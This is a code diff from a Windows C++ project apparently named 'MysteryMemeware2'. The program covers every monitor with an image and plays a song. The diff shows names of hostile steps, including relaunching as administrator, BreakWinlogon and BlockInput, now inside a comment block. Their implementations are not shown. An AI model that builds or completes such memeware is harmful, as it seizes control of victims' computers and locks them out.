@@ -1,4 +1,6 @@
-#include "CoverImage.h"
+//#include "CoverImage.h"
+#include "MysterySong.h"
+#include "EZAudioClient.h"
 #include "EZProgram.h"
 #include "Helper.h"
 #include "SysControl.h"
@@ -64,7 +66,7 @@ void CoverMonitor(HMONITOR monitor) {
 
 		EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);
 
-		mysteryImage = program->GetRenderer()->LoadBitmap(L"D:\\Coding\\C++\\MysteryMemeware2\\CoverImage.bmp");
+		//mysteryImage = program->GetRenderer()->LoadBitmap(CoverImage_Asset);
 
 		program->Run();
 
@@ -102,36 +104,7 @@ MonitorList GetMonitors() {
 }
 
 int main() {
-	EZ::ClassSettings classSettings = { };
-	classSettings.ThisThreadOnly = TRUE;
-
-	EZ::WindowSettings windowSettings = { };
-	windowSettings.LaunchHidden = TRUE;
-
-	EZ::RendererSettings rendererSettings = { };
-
-	ID2D1Bitmap* mysteryImage = nullptr;
-
-	EZ::ProgramSettings programSettings = { };
-	programSettings.PreformanceLogInterval = 1000;
-	programSettings.UpdateCallback = Update;
-	programSettings.UserData = &mysteryImage;
-
-	EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);
-
-	TimerStart();
-
-	mysteryImage = program->GetRenderer()->LoadBitmap(CoverImage_Asset);
-
-	TimerEnd();
-
-	program->Run();
-
-	delete program;
-}
-
-/*
-int main() {
+	/*
 	if (!IsAdmin()) {
 		RelaunchAsAdmin();
 		return 0;
@@ -149,11 +122,10 @@ int main() {
 	BreakWinlogon();
 
 	BlockInput();
+	*/
 
-
-
-	LONGLONG startTime = 0;
-	QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&startTime));
+	EZ::PlayWAVExclusive(MysterySong_Asset);
+	return 0;
 
 	MonitorList monitors = GetMonitors();
 
@@ -162,14 +134,8 @@ int main() {
 		CoverMonitor(monitors.list[i]);
 	}
 
-	LONGLONG timeNow = 0;
-	QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timeNow));
-
-	std::cout << "Took: " << (timeNow - startTime) << " ticks for main thread to finish starting sub-threads." << std::endl;
-
 	while (OpenWindowCount > 0) {}
 
 	delete[] monitors.list;
 	return 0;
 }
-*/
